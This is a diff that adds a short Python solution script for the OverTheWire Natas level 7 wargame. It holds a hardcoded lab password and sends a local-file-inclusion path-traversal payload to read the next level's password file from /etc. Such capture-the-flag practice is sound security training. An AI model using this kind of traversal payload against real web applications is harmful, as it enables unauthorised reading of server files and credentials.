@@ -1,0 +1,17 @@
+import requests
+from requests.auth import HTTPBasicAuth
+from bs4 import BeautifulSoup
+
+url = 'http://natas7.natas.labs.overthewire.org/'
+password = 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS' # change to actual password
+
+# in 'index.php?page=home' exists LFI vuln
+# password for next level stored in /etc/natas_webpass/natas8
+
+payload = 'index.php?page=/../../../../../../etc/natas_webpass/natas8'
+r = (requests.get(url=url+payload, auth=HTTPBasicAuth('natas7', password=password)))
+
+soup = BeautifulSoup(r.text, 'html.parser')
+pas = soup.text.split()[3]
+
+print(f"natas8:{pas}")
